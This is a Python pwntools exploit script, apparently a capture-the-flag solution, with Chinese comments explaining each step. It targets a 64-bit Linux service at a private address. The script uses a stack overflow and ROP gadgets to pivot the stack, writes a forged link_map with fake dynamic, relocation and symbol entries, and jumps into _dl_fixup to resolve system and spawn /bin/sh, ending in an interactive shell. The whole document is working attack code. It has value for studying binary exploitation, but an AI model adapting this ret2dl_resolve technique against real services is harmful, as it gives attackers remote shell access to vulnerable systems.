#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote('172.17.0.3', 10001)

context.update(os = 'linux', arch = 'amd64')

universal_gadget1 = 0x4006aa	#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn
universal_gadget2 = 0x400690	#mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]

main_got = 0x600a68
pop_rdi_ret = 0x4006b3
jmp_dl_fixup = 0x4004a6
pop_rbp_ret = 0x400550
leave_ret = 0x400618
read_got = 0x600a60
new_stack_addr = 0x600ad0
fake_link_map_addr = 0x600b00

payload = ""
payload += 'A'*136						#padding
payload += p64(universal_gadget1)		#使用万能gadgets调用read向新栈中写入数据
payload += p64(0x0)
payload += p64(0x1)
payload += p64(read_got)
payload += p64(0x500)
payload += p64(new_stack_addr)
payload += p64(0x0)
payload += p64(universal_gadget2)
payload += 'A'*0x38						#栈修正

payload += p64(pop_rbp_ret)				#返回到pop rbp;
payload += p64(new_stack_addr)
payload += p64(leave_ret)

io.send(payload)						#输入向新栈写伪造的link_map和栈劫持的payload

sleep(0.5)

offset = 0x253a0 #system - __libc_start_main

fake_Elf64_Dyn = ""
fake_Elf64_Dyn += p64(0)								#d_tag		从link_map中找.rel.plt不需要用到标签， 随意设置
fake_Elf64_Dyn += p64(fake_link_map_addr + 0x18)		#d_ptr		指向伪造的Elf64_Rela结构体，由于reloc_offset也被控制为0，不需要伪造多个结构体

fake_Elf64_Rela = ""
fake_Elf64_Rela += p64(fake_link_map_addr - offset)		#r_offset	rel_addr = l->addr+reloc_offset，直接指向fake_link_map所在位置令其可读写就行
fake_Elf64_Rela += p64(7)								#r_info		index设置为0，最后一字节必须为7
fake_Elf64_Rela += p64(0)								#r_addend	随意设置

fake_Elf64_Sym = ""
fake_Elf64_Sym += p32(0)								#st_name	随意设置
fake_Elf64_Sym += 'AAAA'								#st_info, st_other, st_shndx st_other非0以避免进入重定位符号的分支
fake_Elf64_Sym += p64(main_got-8)						#st_value	已解析函数的got表地址-8，-8体现在汇编代码中，原因不明
fake_Elf64_Sym += p64(0)								#st_size	随意设置

fake_link_map_data = ""
fake_link_map_data += p64(offset)			#l_addr，伪造为两个函数的地址偏移值
fake_link_map_data += fake_Elf64_Dyn
fake_link_map_data += fake_Elf64_Rela
fake_link_map_data += fake_Elf64_Sym
fake_link_map_data += '\x00'*0x20
fake_link_map_data += p64(fake_link_map_addr)		#DT_STRTAB	设置为一个可读的地址
fake_link_map_data += p64(fake_link_map_addr + 0x30)#DT_SYMTAB	指向对应结构体数组的地址
fake_link_map_data += "/bin/sh\x00"					
fake_link_map_data += '\x00'*0x78
fake_link_map_data += p64(fake_link_map_addr + 0x8)	#DT_JMPREL	指向对应数组结构体的地址

payload = ""
payload += "AAAAAAAA"
payload += p64(pop_rdi_ret)
payload += p64(fake_link_map_addr+0x78)	#/bin/sh\x00地址
payload += p64(jmp_dl_fixup)			#用jmp跳转到_dl_fixup，link_map和reloc_offset都由我们自己伪造
payload += p64(fake_link_map_addr)		#伪造的link_map地址
payload += p64(0)						#伪造的reloc_offset
payload += fake_link_map_data

io.send(payload)
io.interactive()
